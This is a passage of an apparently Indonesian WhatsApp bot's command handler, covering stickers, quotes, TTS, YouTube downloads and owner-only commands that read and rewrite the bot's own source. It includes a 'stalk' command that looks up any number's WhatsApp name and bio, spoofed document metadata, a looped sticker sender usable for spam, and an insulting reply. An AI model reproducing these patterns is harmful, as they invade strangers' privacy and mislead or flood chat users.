 fileName: `Hai Kak ${pushname}`,
 mimetype: pickRandom(listfakedocs),
 fileLength: 100000000000, // Sesuaikan dengan ukuran file yang lebih realistis
 pageCount: 999, // Sesuaikan dengan dokumen yang dikirim
 caption: menunya,
 contextInfo: {
 mentionedJid: [m.sender, '0@s.whatsapp.net', owner[0] + '@s.whatsapp.net'],
 forwardingScore: 10,
 isForwarded: true,
 forwardedNewsletterMessageInfo: {
 newsletterJid: '0@newsletter',
 serverMessageId: null,
 newsletterName: 'Hello Everyone My name is Avosky'
 },
 externalAdReply: {
 title: `${hariini} ⏲️`,
 body: `${runtime(uptime)}`,
 showAdAttribution: true,
 thumbnailUrl: profile, // Menggunakan profil yang didapat dari getPp
 mediaType: 1,
 previewType: 0,
 renderLargerThumbnail: true,
 mediaUrl: 'https://avosky.com',
 sourceUrl: 'https://avosky.com'
 }
 }
 }, { quoted: fkontak });
}
break

case 'getcase': {
const didyoumean = require('didyoumean');
const similarity = require('similarity')
function getCaseNames() {
    try {
        // Baca kedua file 'sky.js' dan 'sky2.js'
        const data1 = fs.readFileSync('sky.js', 'utf8');
        const data2 = fs.readFileSync('sky2.js', 'utf8');

        // Gabungkan konten dari kedua file
        const combinedData = data1 + '\n' + data2;

        // Pola untuk menemukan case
        const casePattern = /case\s+'([^']+)'/g;
        const matches = combinedData.match(casePattern);

        if (matches) {
            // Ekstrak nama case
            const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
            return caseNames;
        } else {
            return [];
        }
    } catch (err) {
        console.log('Terjadi kesalahan:', err);
        return [];
    }
}
    if (!isCreator) {
        m.reply('Anda tidak memiliki izin untuk mengambil case.');
        return;
    }
    if (!q) {
        m.reply('Silakan masukkan nama case yang ingin diambil.');
        return;
    }
    
    const caseName = q.trim(); // Nama case yang diminta
    const cases = fs.readFileSync('sky.js').toString() + '\n' + fs.readFileSync('sky2.js').toString(); // Gabungkan file sky.js dan sky2.js
    
    // Dapatkan semua nama case
    let caseNames = getCaseNames();
    
    // Cari case berdasarkan nama
    const caseStart = cases.indexOf(`case '${caseName}':`);
    if (caseStart === -1) {
        let mean = didyoumean(caseName, caseNames);
        let sim = similarity(caseName, mean);
        let similarityPercentage = parseInt(sim * 100);

        if (mean && caseName.toLowerCase() !== mean.toLowerCase()) {
            let response = `_Case Yang Kamu Ingin Ambil Tidak Ada Apakah Kamu Iangin Ambil Case_\n\n> _${mean}_\n> _Kemiripan: ${similarityPercentage}%_`;
            m.reply(response);
        } else {
            m.reply(`Case '${caseName}' tidak ditemukan.`);
        }
        return;
    }
    
    // Cari bagian akhir case hingga "break"
    const caseEnd = cases.indexOf('break', caseStart);
    if (caseEnd === -1) {
        m.reply('Gagal menemukan akhir case. Pastikan case ditutup dengan break.');
        return;
    }
    
    // Ambil isi case (dari awal case hingga break)
    const caseBody = cases.slice(caseStart, caseEnd + 5); // +5 untuk menyertakan 'break'
    
    // Kirimkan isi case kepada pengguna
    m.reply(`${caseBody}`);
}
break
case 'addcase': {
    if (!isCreator) {
        m.reply('Anda tidak memiliki izin untuk menambahkan case baru.');
        return;
    }
    if (!text) {
        m.reply('Silakan masukkan isi case.');
        return;
    }
    
    const cases = fs.readFileSync('sky.js').toString();
    const caseBody = text;
    const caseName = caseBody.match(/case '(.*?)':/)[1]; // Mendapatkan nama case dari teks case baru
    
    // Cari apakah case dengan nama yang sama sudah ada
    const startIndex = cases.indexOf(`case '${caseName}':`);
    if (startIndex !== -1) {
        // Jika ditemukan, hapus case lama sebelum menambahkan yang baru
        const endIndex = cases.indexOf('break', startIndex) + 6; // +6 untuk memasukkan break;
        const updatedCases = cases.slice(0, startIndex) + caseBody + '\n' + cases.slice(endIndex);
        fs.writeFileSync('sky.js', updatedCases);
        m.reply(`Case '${caseName}' berhasil diperbarui.`);
    } else {
        // Jika tidak ditemukan, tambahkan case baru di akhir file seperti sebelumnya
        const indexOfBreak = cases.lastIndexOf('//ADDF');
        if (indexOfBreak === -1) {
            m.reply('Terjadi kesalahan dalam menemukan tempat untuk menambahkan case.');
            return;
        }
        const newCase = `${caseBody}\n`;
        const updatedCases = cases.slice(0, indexOfBreak) + newCase + cases.slice(indexOfBreak);
        fs.writeFileSync('sky.js', updatedCases);
        m.reply('Case baru berhasil ditambahkan!');
    }
    }
    break
case 'haram': {
m.reply(`yahahha ${pushname} anak haram akwowkwo`)
}
break
case 'tts': case 'say': {
 if (!q) return m.reply(`query?`);
 try {
 const a = await (
 await axios.post(
 "https://gesserit.co/api/tiktok-tts",
 { text: text, voice: "id_001" },
 {
 headers: {
 Referer: "https://gesserit.co/tiktok",
 "User-Agent":
 "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
 responseType: "arraybuffer",
 },
 },
 )
 ).data;

 const b = Buffer.from(a.audioUrl);
 sky.sendMessage(m.chat, {
 audio: Buffer.from(a.audioUrl.split("base64,")[1], "base64"),
 mimetype: "audio/mpeg",
 ptt: true, // This ensures that the audio is sent as a PTT (voice note)
 }, { quoted: m });
 } catch (error) {
 m.reply(`Error: ${error.message}`, m);
 }
}
break;




case 'bing-img': {
 if (!isPrem) return replyprem(mess.premium)
 if (!text) throw `_mau bkin apa coba_`
 const apiUrl = `https://widipe.com/bingimg?text=${encodeURIComponent(text)}`;

 axios.get(apiUrl)
 .then(response => {
 const data = response.data;
 if (data.status && data.result.length > 0) {
 const imageUrls = data.result.slice(0, 4); // Ambil 4 URL gambar pertama

 // Mengirim gambar satu per satu dengan jeda 1 detik
 imageUrls.forEach((imageUrl, index) => {
 setTimeout(() => {
 sky.sendFile(from, imageUrl, `image_${index + 1}.jpg`, `Gambar ${index + 1}`);
 }, index * 1000); // Jeda 1 detik per output
 });
 } else {
 m.reply('Tidak ada hasil gambar untuk kata kunci yang diberikan.');
 }
 })
 .catch(error => {
 console.error('Error fetching images:', error);
 m.reply('Terjadi kesalahan saat mencari gambar. Silakan coba lagi nanti.');
 });
 }
 break
case 'stalk': {
 const PhoneNumber = require('awesome-phonenumber');

 if (!text) return m.reply('Contoh penggunaan: wastalk 62xxxxxxxxxxx');

 const phoneNumber = text.trim();
 
 // Check if the phone number is valid
 if (!phoneNumber || isNaN(phoneNumber)) {
 return m.reply('Nomor tidak valid. Contoh penggunaan: wastalk 62xxxxxxxxxxx');
 }

 // Check if the phone number is a valid WhatsApp number and get name and bio
 async function wastalk() {
 try {
 const isWhatsApp = await sky.onWhatsApp(`${phoneNumber}@s.whatsapp.net`);
 if (isWhatsApp.length !== 0) {
 const name = await sky.getName(`${phoneNumber}@s.whatsapp.net`);
 const status = await sky.fetchStatus(`${phoneNumber}@s.whatsapp.net`);
 const bio = status.status || 'Bio di private';

 m.reply(`Nomor ini terdaftar di WhatsApp!\nNama: ${name}\nBio: ${bio}\nChat: https://wa.me/${phoneNumber}`);
 } else {
 m.reply('Nomor ini tidak terdaftar di WhatsApp.');
 }
 } catch (error) {
 console.error(error);
 m.reply('Terjadi kesalahan dalam memeriksa atau mengambil data pengguna WhatsApp.');
 }
 }

 wastalk();
}
break
case 'tagadmin': {
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
 const groupAdmins = participants.filter(p => p.admin)
 const listAdmin = groupAdmins.map((v, i) => `${i + 1}. @${v.id.split('@')[0]}`).join('\n')
 const owner = groupMetadata.owner || groupAdmins.find(p => p.admin === 'superadmin')?.id || m.chat.split`-`[0] + '@s.whatsapp.net'
 let text = ` 
*TAG ADMIN*
${listAdmin}
`.trim()
sky.sendMessage(m.chat, {text : text, mentions: [...groupAdmins.map(v => v.id), owner] }, {quoted: m})
}
break
case 'qc2': {
 if (!q) return m.reply(`gunakan qc2 hai | warna nya\nContoh warna #88BfG`);
 m.reply(mess.wait);

 // Function to get profile picture URL
 async function getPp(sky, target) {
 try {
 const response = await sky.query({
 tag: "iq",
 attrs: {
 target: target,
 to: "@s.whatsapp.net",
 type: "get",
 xmlns: "w:profile:picture"
 },
 content: [{
 tag: "picture",
 attrs: {
 type: "image",
 query: "url"
 }
 }]
 });
 return response.content[0]?.attrs?.url || 'https://telegra.ph/file/f3def2b4dba511b19b48a.jpg';
 } catch (error) {
 console.error('Error fetching profile picture:', error);
 return 'https://telegra.ph/file/f3def2b4dba511b19b48a.jpg'; // Fallback URL
 }
 }

 // Function to send quote image as sticker
 async function sendQuoteSticker(text, bgColor, user) {
 const profilePicUrl = await getPp(sky, user);
 const name = user === sender ? pushname : await sky.getName(user);

 const json = {
 "type": "quote",
 "format": "png",
 "backgroundColor": bgColor,
 "width": 512,
 "height": 768,
 "scale": 2,
 "messages": [
 {
 "entities": [],
 "avatar": true,
 "from": {
 "id": 1,
 "name": name,
 "photo": {
 "url": profilePicUrl
 }
 },
 "text": text,
 "replyMessage": {}
 }
 ]
 };

 try {
 const response = await axios.post('https://quotly.netorare.codes/generate', json, {
 headers: {'Content-Type': 'application/json'}
 });
 const buffer = Buffer.from(response.data.result.image, 'base64');
 const opt = { packname: "©Sky", author: "SkY-MD" };
 await sky.sendImageAsSticker(from, buffer, m, opt);
 } catch (error) {
 console.error('Error generating quote:', error);
 m.reply('Terjadi kesalahan saat menghasilkan gambar quote.');
 }
 }

 let [textPart, bgColor] = text.split(' | ');
 textPart = textPart || '-';
 bgColor = bgColor || '-';

 const user = quoted ? sender : (mentionUser[0] || sender); // Use sender if mentionUser is not available
 await sendQuoteSticker(textPart, bgColor, user);
}
 break
case 'qc4': {
 m.reply(mess.wait);

 // Daftar 70 warna acak
 const colors = [
 'red', 'yellow', 'green', 'black', 'white', 'pink', 'blue', 'purple', 'orange', 'brown', 'gray', 'gold', 'silver', 
 'cyan', 'magenta', 'lime', 'indigo', 'violet', 'khaki', 'coral', 'navy', 'teal', 'salmon', 'maroon', 'olive', 'plum', 
 'orchid', 'sienna', 'crimson', 'turquoise', 'tan', 'lavender', 'peach', 'aqua', 'azure', 'beige', 'chartreuse', 
 'chocolate', 'firebrick', 'forestgreen', 'fuchsia', 'gainsboro', 'honeydew', 'ivory', 'lavenderblush', 'lemonchiffon', 
 'lightblue', 'lightcoral', 'lightcyan', 'lightgoldenrodyellow', 'lightgray', 'lightgreen', 'lightpink', 'lightsalmon', 
 'lightseagreen', 'lightskyblue', 'lightslategray', 'lightsteelblue', 'lightyellow', 'limegreen', 'mediumaquamarine', 
 'mediumblue', 'mediumorchid', 'mediumpurple', 'mediumseagreen', 'mediumslateblue', 'mediumspringgreen', 'mediumturquoise'
 ];

 const args = text.split(' | ');
 if (args.length < 2 || isNaN(args[1])) {
 m.reply(`Format salah. Gunakan format: ${command} haii | jumlah`);
 break;
 }

 const messageText = args[0];
 const count = parseInt(args[1]);

 async function sendQuote() {
 const randomColor = colors[Math.floor(Math.random() * colors.length)];

 if (!quoted) {
 try {
 var linkppuserp = await sky.profilePictureUrl(mentionUser[0], 'image');
 } catch {
 var linkppuserp = 'https://telegra.ph/file/f3def2b4dba511b19b48a.jpg';
 }
 const getname = await sky.getName(mentionUser[0]);
 const json = {
 "type": "quote",
 "format": "png",
 "backgroundColor": `${randomColor}`,
 "width": 512,
 "height": 768,
 "scale": 2,
 "messages": [
 {
 "entities": [],
 "avatar": true,
 "from": {
 "id": 1,
 "name": getname,
 "photo": {
 "url": linkppuserp
 }
 },
 "text": `${messageText}`,
 "replyMessage": {}
 }
 ]
 };
 const response = await axios.post('https://quotly.netorare.codes/generate', json, {
 headers: {'Content-Type': 'application/json'}
 });
 const buffer = Buffer.from(response.data.result.image, 'base64');
 var opt = { packname: "©sky", author: "AVS-MD" };
 await sky.sendImageAsSticker(from, buffer, m, opt);
 } else if (quoted) {
 try {
 var linkppuserp = await sky.profilePictureUrl(sender, 'image');
 } catch {
 var linkppuserp = 'https://telegra.ph/file/f3def2b4dba511b19b48a.jpg';
 }
 const json = {
 "type": "quote",
 "format": "png",
 "backgroundColor": `${randomColor}`,
 "width": 512,
 "height": 768,
 "scale": 2,
 "messages": [
 {
 "entities": [],
 "avatar": true,
 "from": {
 "id": 1,
 "name": pushname,
 "photo": {
 "url": linkppuserp
 }
 },
 "text": `${messageText}`,
 "replyMessage": {}
 }
 ]
 };
 const response = await axios.post('https://quotly.netorare.codes/generate', json, {
 headers: {'Content-Type': 'application/json'}
 });
 const buffer = Buffer.from(response.data.result.image, 'base64');
 var opt = { packname: "©Sky", author: "SkY-MD" };
 await sky.sendImageAsSticker(from, buffer, m, opt);
 }
 }

 for (let i = 0; i < count; i++) {
 await sendQuote();
 await new Promise(resolve => setTimeout(resolve, 1000)); // Delay 1 detik
 }
}
break
case 'quotes': {
 const axios = require('axios');
 const translate = require('translate-google');

 axios.get('https://zenquotes.io/api/random')
 .then(response => {
 const quoteData = response.data[0];
 const quoteText = `"${quoteData.q}" - ${quoteData.a}`;
 const imageUrl = 'https://telegra.ph/file/db3c125cded88c91855fc.jpg'; // Placeholder image URL

 translate(quoteText, { to: 'id' })
 .then(translatedText => {
 sky.sendFile(m.chat, imageUrl, 'quotes.jpg', translatedText);
 })
 .catch(err => {
 console.error('Error translating quote:', err);
 m.reply('Maaf, terjadi kesalahan saat menerjemahkan quotes.');
 });
 })
 .catch(error => {
 console.error('Error fetching quote:', error);
 m.reply('Maaf, terjadi kesalahan saat mengambil quotes.');
 });
}
break
case 'quotesimage': {
 const axios = require('axios');
 async function fetchQuote() {
 try {
 const response = await axios.get('https://zenquotes.io/api/random');
 const { q: quote, a: author } = response.data[0];
 return { quote, author };
 } catch (error) {
 console.error('Error fetching quote:', error);
 return null;
 }
 }
 async function fetchBackgroundImage() {
 try {
 const response = await axios.get('https://picsum.photos/800/600');
 const imageUrl = response.request.res.responseUrl;
 return imageUrl;
 } catch (error) {
 console.error('Error fetching background image:', error);
 return null;
 }
 }
 fetchQuote().then(quoteData => {
 fetchBackgroundImage().then(imageUrl => {
 if (!quoteData || !quoteData.quote || !imageUrl) {
 m.reply('Maaf, terjadi kesalahan dalam membuat gambar kutipan.');
 return;
 }
 const { quote, author } = quoteData;
 m.reply('Sedang membuat gambar kutipan...');
 sky.sendFile(m.chat, imageUrl, 'quote-image.jpg', `Kutipan: "${quote}" - ${author}`);
 });
 });
}
 break
case 'ai6': {
 if (!text) throw `_yes bro ada apa_`
 try {
 const { data } = await axios.get(`https://itzpire.com/ai/gpt-logic?q=${encodeURIComponent(text)}&logic=polisi&chat_id=778822`);
 m.reply(`${data.result}`.trim());
 } catch (error) {
 m.reply("Maaf, sedang terjadi gangguan. Mohon coba lagi nanti.");
 }
}
break
case 'colorcombine': {
 const { createCanvas } = require('canvas');
 
 if (!text || !text.includes(',')) throw `Format yang benar: warna1,warna2`;
 
 const colors = text.split(',');
 if (colors.length !== 2) throw `Masukkan dua warna yang dipisahkan dengan koma.`;
 
 const [color1, color2] = colors.map(color => color.trim());
 
 const canvasWidth = 400; // Lebar gambar
 const canvasHeight = 400; // Tinggi gambar
 const canvas = createCanvas(canvasWidth, canvasHeight);
 const ctx = canvas.getContext('2d');
 
 // Membuat gradien linier dari warna pertama ke warna kedua
 const gradient = ctx.createLinearGradient(0, 0, canvasWidth, canvasHeight);
 gradient.addColorStop(0, color1);
 gradient.addColorStop(1, color2);
 
 // Mengisi canvas dengan gradien
 ctx.fillStyle = gradient;
 ctx.fillRect(0, 0, canvasWidth, canvasHeight);
 
 const base64Image = canvas.toDataURL('image/png');
 sky.sendFile(from, base64Image, 'warna-gabungan.png', 'Berikut adalah gambar gabungan dari dua warna.');
}
break
case 'galaxy': {
 const { createCanvas } = require('canvas');
 
 const canvasWidth = 800;
 const canvasHeight = 800;
 const canvas = createCanvas(canvasWidth, canvasHeight);
 const ctx = canvas.getContext('2d');

 // Membuat gradien radial untuk efek nebula
 const gradient = ctx.createRadialGradient(canvasWidth / 2, canvasHeight / 2, 0, canvasWidth / 2, canvasHeight / 2, canvasWidth / 2);
 gradient.addColorStop(0, 'rgba(255, 255, 255, 0.3)'); // Putih lembut di pusat
 gradient.addColorStop(0.5, 'rgba(255, 0, 255, 0.2)'); // Ungu
 gradient.addColorStop(1, 'rgba(0, 0, 0, 1)'); // Hitam di tepi

 ctx.fillStyle = gradient;
 ctx.fillRect(0, 0, canvasWidth, canvasHeight);

 // Menambahkan bintang
 const numStars = 500;
 ctx.fillStyle = 'white';
 for (let i = 0; i < numStars; i++) {
 const x = Math.random() * canvasWidth;
 const y = Math.random() * canvasHeight;
 const radius = Math.random() * 2;
 ctx.beginPath();
 ctx.arc(x, y, radius, 0, Math.PI * 2);
 ctx.fill();
 }

 const base64Image = canvas.toDataURL('image/png');
 sky.sendFile(from, base64Image, 'galaxy.png', 'Berikut adalah efek galaksi yang telah dibuat.');
}
break
case 'ytmp4': {
 if (!text) return m.reply('Example: ' + prefix + 'ytmp4 https://www.youtube.com/watch?v=VIDEO_ID');

 let yts = require("yt-search");

 // Function untuk mengunduh video menggunakan API
 async function mp4(url) {
 try {
 const response = await fetch('https://api.zeemo.ai/hy-caption-front/api/v1/video-download/yt-dlp-video-info', {
 method: 'POST',
 headers: {
 'Content-Type': 'application/json',
 'Accept': '*/*',
 'User-Agent': 'Postify/1.0.0'
 },
 body: JSON.stringify({ url, videoSource: 3 })
 });
 const { data } = await response.json();
 return {
 status: true,
 creator: '@avosky',
 title: data.videoName,
 url: data.sourceVideoUrl,
 media: data.downloadUrl
 };
 } catch {
 return {
 status: false,
 msg: 'Data tidak dapat ditemukan!'
 };
 }
 }

 // Cek apakah URL diberikan dengan benar
 let videoUrl = text.trim();
 if (!ytdl.validateURL(videoUrl)) {
 return m.reply('URL YouTube tidak valid.');
 }

 // Unduh video dari URL menggunakan function mp4
 let vid = await mp4(videoUrl);

 // Cek apakah video berhasil diunduh
 if (!vid.status) {
 return m.reply(vid.msg);
 }

 // Buat teks caption dengan detail video
 let caption = `
Title: ${vid.title}
Creator: ${vid.creator}
URL: ${vid.url}
`;

 // Kirim video ke pengguna
 await sky.sendMessage(m.chat, {
 video: { url: vid.media },
 caption: caption
 }, { quoted: m });
}
break;

case 'ytmp3': {
 if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply('Maaf, limit download kamu habis.');

 db.data.users[m.sender].limit -= 10; // Kurangi limit
 if (!text || !text.trim()) return m.reply("Link atau kata kunci yang ingin dicari?");

 const axios = require('axios');

 // Definisi kelas YouTubeDownloader
 class YouTubeDownloader {
 static async downloadVideo(url, downtype, vquality) {
 const regex = /(?:https?:\/\/)?(?:www\.)?(?:youtube\.com\/(?:shorts\/|watch\?v=|music\?v=|embed\/|v\/|.+\/)|youtu\.be\/)([a-zA-Z0-9_-]{11})/;
 const match = url.match(regex);

 if (!match) {
 throw new Error('URL tidak valid. Silakan masukkan URL YouTube yang benar.');
 }

 const videoId = match[1];
 const data = new URLSearchParams({ videoid: videoId, downtype, vquality });

 try {
 const response = await axios.post('https://api-cdn.saveservall.xyz/ajax-v2.php', data, {
 headers: { 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8' }
 });
 return response.data.url;
 } catch (error) {
 throw new Error('Terjadi kesalahan: ' + error.message);
 }
 }

 static async download(url, { mp4 = '360', mp3 = '128' } = {}) {
 try {
 const mp4Link = await YouTubeDownloader.downloadVideo(url, 'mp4', mp4);
 const mp3Link = await YouTubeDownloader.downloadVideo(url, 'mp3', mp3);
 return { mp4: mp4Link, mp3: mp3Link };
 } catch (error) {
 throw new Error(error.message);
 }
 }

 static async search(query) {
 const url = `https://api.flvto.top/@api/search/YouTube/${encodeURIComponent(query)}`;

 try {
 const response = await axios.get(url, {
 headers: {
 'Accept-Encoding': 'gzip, deflate, br',
 'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
 'Cache-Control': 'no-cache',
 'Origin': 'https://keepvid.online',
 'Referer': 'https://keepvid.online/',
 'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
 }
 });

 return response.data.items.map(item => ({
 ...item,
 url: `https://www.youtube.com/watch?v=${item.id}`
 }));
 } catch (error) {
 throw new Error('Gagal mengambil hasil pencarian: ' + error.message);
 }
 }
 }

 await sky.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

 try {
 // Mengecek apakah input adalah URL atau pencarian
 let videoUrl;
 const regex = /(?:https?:\/\/)?(?:www\.)?(?:youtube\.com\/(?:watch\?v=|shorts\/)|youtu\.be\/)([a-zA-Z0-9_-]{11})/;
 
 if (regex.test(text)) {
 // Jika input adalah URL, gunakan langsung
 videoUrl = text;
 } else {
 // Jika input adalah kata kunci, gunakan fungsi search untuk mendapatkan URL video
 let searchResults = await YouTubeDownloader.search(text);
 if (searchResults.length === 0) return m.reply('Video tidak ditemukan.');
 videoUrl = searchResults[0].url;
 }

 // Mendapatkan link unduhan untuk format MP3
 let { mp3 } = await YouTubeDownloader.download(videoUrl, { mp3: '128' });

 if (mp3) {
 // Mengunduh dan mengirim file audio MP3
 const audioStream = (await axios.get(mp3, { responseType: 'arraybuffer' })).data;

 await sky.sendMessage(m.chat, {
 audio: audioStream,
 mimetype: 'audio/mpeg',
 ptt: false, // Set to true if you want to send as voice note
 contextInfo: {
 externalAdReply: {
 title: "Download berhasil!",
 body: `_Audio MP3 dari YouTube_`,
 mediaType: 2,
 mediaUrl: 'https://iili.io/22CnueV.jpg',
 sourceUrl: videoUrl,
 renderLargerThumbnail: true
 }
 }
 });

 await sky.sendMessage(m.chat, { react: { text: "✅", key: m.key } });
 } else {
 m.reply("Gagal mengambil audio. Silakan coba lagi.");
 }
 } catch (error) {
 m.reply("Terjadi kesalahan, coba lagi nanti!");
 console.error(error);
 }
}
break


case 'qc3': {
 if (!q) return m.reply(`contoh qc hai`);
 m.reply(mess.wait);

 // Daftar warna yang tersedia
 const colors = ['red', 'yellow', 'green', 'black', 'white', 'pink', 'blue', 'purple', 'orange', 'brown', 'gray'];

 // Memilih warna acak dari daftar
 const randomColor = colors[Math.floor(Math.random() * colors.length)];

 // Function to get profile picture URL
 async function getPp(sky, target) {
 try {
 const response = await sky.query({
 tag: "iq",
 attrs: {
 target: target,
 to: "@s.whatsapp.net",
 type: "get",
 xmlns: "w:profile:picture"
 },
 content: [{
 tag: "picture",
 attrs: {
 type: "image",
 query: "url"
 }
 }]
 });
 return response.content[0]?.attrs?.url || 'https://telegra.ph/file/f3def2b4dba511b19b48a.jpg'; // Fallback URL
 } catch (error) {
 console.error('Error fetching profile picture:', error);
 return 'https://telegra.ph/file/f3def2b4dba511b19b48a.jpg'; // Fallback URL
 }
 }

 // Function to send quote image as sticker
 async function sendQuoteSticker(text, color, user) {
 const profilePicUrl = await getPp(sky, user);
 const name = user === sender ? pushname : await sky.getName(user);

 const json = {
 "type": "quote",
 "format": "png",
 "backgroundColor": color,
 "width": 512,
 "height": 768,
 "scale": 2,
 "messages": [
 {
 "entities": [],
 "avatar": true,
 "from": {
 "id": 1,
 "name": name,
 "photo": {
 "url": profilePicUrl
 }
 },
 "text": text,
 "replyMessage": {}
 }
 ]
 };

 try {
 const response = await axios.post('https://quotly.netorare.codes/generate', json, {
 headers: {'Content-Type': 'application/json'}
 });
 const buffer = Buffer.from(response.data.result.image, 'base64');
 const opt = { packname: "©Sky", author: "SkY-MD" };
 await sky.sendImageAsSticker(from, buffer, m, opt);
 } catch (error) {
 console.error('Error generating quote:', error);
 m.reply('Terjadi kesalahan saat menghasilkan gambar quote.');
 }
 }

 if (quoted) {
 const user = sender;
 const textPart = q || '-'; // Use `q` for quoted text
 await sendQuoteSticker(textPart, randomColor, user);
 } else if (mentionUser.length > 0) {
 const user = mentionUser[0];
 const textPart = q || '-'; // Use default text if not provided
 await sendQuoteSticker(textPart, randomColor, user);
 } else {
 m.reply(`Kirim perintah ${command} haii`);
 }
}
 break
case 'attp': {
 try {
 if (!args[0]) throw `Tidak ada teks yang diberikan`;
 const { createCanvas } = require('canvas');
 const GIFEncoder = require('gifencoder');
 
 const text = `${q}`;
 const width = 400;
 const height = 400;
 const fontSize = 48; // Ukuran teks lebih besar
 const frames = 15; // Jumlah frame lebih banyak untuk memperhalus animasi
 const colors = [
 '#FF0000', '#00FF00', '#0000FF', '#FFFF00', '#00FFFF', '#FF00FF',
 '#FFA500', '#800080', '#008080', '#FFC0CB', '#FFD700', '#00BFFF',
 '#8A2BE2', '#FF69B4', '#B22222'
 ];
 
 const encoder = new GIFEncoder(width, height);
 encoder.start();
 encoder.setRepeat(0); // 0 untuk loop tak terbatas
 encoder.setDelay(300); // Waktu delay antar frame dalam milidetik (lebih cepat)
 encoder.setQuality(10); // Kualitas gambar
 
 for (let i = 0; i < frames; i++) {
 const canvas = createCanvas(width, height);
 const context = canvas.getContext('2d');
 
 // Mengisi latar belakang dengan warna hitam
 context.fillStyle = '#000000';
 context.fillRect(0, 0, width, height);
 
 // Mengatur properti teks
 context.fillStyle = colors[i % colors.length];
 context.font = `${fontSize}px Tahoma`;
 context.textAlign = 'center';
 
 // Membungkus teks jika melebihi lebar kanvas
 const words = text.split(' ');
 let line = '';
 let lines = [];
 for (let n = 0; n < words.length; n++) {
 let testLine = line + words[n] + ' ';
 let metrics = context.measureText(testLine);
 let testWidth = metrics.width;
 if (testWidth > width && n > 0) {
 lines.push(line);
 line = words[n] + ' ';
 } else {
 line = testLine;
 }
 }
 lines.push(line);
 
 // Menentukan posisi awal teks
 let x = width / 2;
 let y = height / 2 - ((lines.length - 1) * fontSize) / 2; // Memastikan teks berada di tengah
 
 // Menulis setiap baris teks
 for (let j = 0; j < lines.length; j++) {
 context.fillText(lines[j], x, y);
 y += fontSize;
 }
 
 encoder.addFrame(context);
 }
 
 encoder.finish();
 
 // Mengirim GIF sebagai stiker
 const buffer = encoder.out.getData();
 sky.sendImageAsSticker(m.chat, buffer, m, { packname: global.packname, author: global.author });
 } catch (err) {
 console.error(err);
 m.reply('Terjadi kesalahan dalam pembuatan stiker. Silakan coba lagi.');
 }
}
break
case 'play': {
 if (!isPremium && global.db.data.users[m.sender].limit < 1) return m.reply('Maaf, limit download kamu habis.');

 db.data.users[m.sender].limit -= 20; // Kurangi limit
 if (!text) return m.reply(`play beautiful in white`);

 await sky.sendMessage(m.chat, { react: { text: "⏳", key: m.key } });

 try {
 let search = await yts(text);
 let videos = search.all.filter(v => v.type === 'video');
 if (!videos.length) {
 await m.reply(m.chat, 'No videos found for your query.', { quoted: m });
 return;
 }

 let video = videos[0];
 let mp3file = `./${video.videoId}.mp3`;

 let stream = ytdl(video.url, { filter: 'audioonly' });
 let writeStream = fs.createWriteStream(mp3file);

 stream.pipe(writeStream);

 stream.on('end', async () => {
 // Pastikan file benar-benar selesai ditulis sebelum melanjutkan
 writeStream.on('finish', async () => {
 try {
 await sky.sendMessage(m.chat, { react: { text: "✅", key: m.key } });

 if (fs.existsSync(mp3file)) {
 await sky.sendMessage(m.chat, {
 audio: fs.readFileSync(mp3file),
 mimetype: 'audio/mpeg',
 contextInfo: {
 externalAdReply: {
 title: video.title,
 body: `Views: ${video.views}`,
 thumbnailUrl: video.thumbnail,
 mediaType: 2,
 mediaUrl: video.url,
 sourceUrl: video.url,
 renderLargerThumbnail: true
 }
 }
 });
 fs.unlinkSync(mp3file);
 } else {
 throw new Error('File not found after download.');
 }
 } catch (error) {
 console.error('Error sending audio:', error);
 await m.reply('Error occurred while sending audio.');
 }
 });
 });

 stream.on('error', async (error) => {
 console.error('Error during download:', error);
 await m.reply('Error occurred during audio download.');
 });

 writeStream.on('error', async (error) => {
 console.error('Error writing file:', error);
 await m.reply('Error occurred while writing the audio file.');
 });

 } catch (error) {
 console.error('Error:', error);
 if (error.statusCode === 403) {
 await m.reply('Download forbidden. Try another video or check your connection.');
 } else {
 await m.reply('Error occurred while processing your request.');
 }
 }
}
break
case 'fillimage': {
 const Jimp = require('jimp');
 const fs = require('fs');
 const path = require('path');

 const q = m.quoted ? m.quoted : m;
 const mime = (q.msg || q).mimetype || '';

 // Pengecekan apakah file yang diterima adalah gambar
 if (!mime || !mime.includes('image')) {
 return m.reply(`Mana gambarnya bang?`);
 }

 m.reply(mess.wait);

 try {
 // Mengunduh gambar dari pesan
 const media = await sky.downloadAndSaveMediaMessage(q);
 const timestamp = Date.now();
 const output = path.join(__dirname, `output_square_${timestamp}.webp`); // Menggunakan nama file unik

 // Menggunakan jimp untuk mengubah gambar lonjong menjadi kotak dan mengkonversi ke format webp
 Jimp.read(media)
 .then(image => {
 return image
 .resize(1080, 1080) // resize image to 1080x1080
 .writeAsync(output) // save the processed image
 .then(() => {
 // Mengirim gambar yang telah diubah sebagai stiker
 sky.sendImageAsSticker(m.chat, output, m, { packname: global.packname, author: global.author })
 .then(() => {
 // Menghapus file setelah selesai
 fs.unlink(output, err => {
 if (err) console.error(`Error deleting output file: ${err.message}`);
 });
 fs.unlink(media, err => {
 if (err) console.error(`Error deleting media file: ${err.message}`);
 });
 })
 .catch(err => {
 console.error(`Error sending sticker: ${err.message}`);
 m.reply(`Error sending sticker: ${err.message}`);
 });
 });
 })
 .catch(err => {
 console.error(`Error processing image: ${err.message}`);
 m.reply(`Error processing image: ${err.message}`);
 });
 } catch (err) {
 console.error(`Error: ${err.message}`);
 m.reply(`Error: ${err.message}`);
 }
}
break
case 'logomaker': {
 const text = args.join(' ') || 'Logo Keren'; // Mengambil teks dari argumen, default ke 'Logo Keren'
 const textProUrl = `https://textpro.me/create-a-3d-text-effect-with-a-glowing-blue-color-1170.html`; 

 // Menggunakan Puppeteer untuk melakukan scraping halaman dan mendapatkan URL gambar
 const puppeteer = require('puppeteer');

 (async () => {
 const browser = await puppeteer.launch();
 const page = await browser.newPage();

 await page.goto(textProUrl);
 
 // Mengisi teks ke form
 await page.type('input[name="text"]', text);
